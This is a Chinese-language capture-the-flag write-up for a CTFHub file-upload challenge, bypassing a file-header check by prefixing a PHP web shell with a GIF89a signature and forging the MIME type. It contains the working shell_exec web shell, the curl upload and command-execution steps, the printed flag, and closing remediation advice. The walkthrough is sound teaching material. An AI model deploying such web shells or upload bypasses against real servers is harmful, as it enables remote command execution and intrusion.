CTFHub - Web - 文件上传 - 文件头检测

# CTFHub # Web # 文件上传 # 文件头检测 # RCE

一、题目信息

  • 题目名称：文件上传 - 文件头检测
  • 题目方向：Web - 文件上传
  • 运行环境：PHP 7.3.14
  • 题目目标：绕过上传接口的文件头检测，上传可执行 PHP 文件并读取 Flag。

二、漏洞分析

首页提供文件上传表单。服务端会读取文件开头并检查是否为允许的图片格式，但没有验证图片是否完整，也没有阻止 .php 扩展名。由于文件头只是文件开头的固定字节，攻击者可以在 PHP 代码前添加合法图片签名来通过检测。

GIF 文件的文件头为 ASCII 字符串 GIF89a。PHP 解释器会忽略 <?php 之前不属于 PHP 标签的普通文本，因此形如 GIF89a<?php ... ?> 的文件既能通过文件头检测，又能在服务端作为 PHP 脚本执行。

三、解题步骤

  1. 构造带 GIF 文件头的 PHP Payload：创建 shell.php，将 GIF89a 放在文件最前面。 
    GIF89a<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
  2. 伪造 MIME 类型并上传：保留 .php 扩展名，将 multipart 请求中的类型声明为 image/gif。 
    curl -i -F "submit=Submit" \
  -F "file=@shell.php;filename=shell.php;type=image/gif" \
  "http://<challenge-host>:10800/"
    上传成功后返回文件路径： 
    upload/shell.php
  3. 验证命令执行：访问上传的 Web Shell，确认脚本以 www-data 身份执行。 
    curl --get \
  --data-urlencode "cmd=id; pwd" \
  "http://<challenge-host>:10800/upload/shell.php"
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html/upload
  4. 定位 Flag 文件：在 Web 根目录查找题目生成的 Flag 文件。 
    find /var/www/html -maxdepth 2 -type f -iname "*flag*" 2>/dev/null
    /var/www/html/flag_23672572.php
  5. 读取 Flag：Flag 位于 PHP 文件的注释中，直接读取源码即可。 
    cat /var/www/html/flag_23672572.php
    <?php // ctfhub{2681cf1afc20e5905a694593}

四、最终 Flag

ctfhub{2681cf1afc20e5905a694593}

五、修复建议

  • 扩展名白名单：仅允许业务需要的安全扩展名，禁止上传 php、phtml 等可执行文件。
  • 完整校验图片：不能只检查前几个字节，应结合图片解析、尺寸和内容完整性进行校验。
  • 服务端重命名：不保留用户控制的文件名和扩展名，由服务端生成随机文件名及固定安全后缀。
  • 隔离上传目录：将文件存放在 Web 根目录之外，或关闭上传目录的脚本执行权限。
  • 最小权限：限制 Web 服务账户对源码目录和系统命令的访问权限。
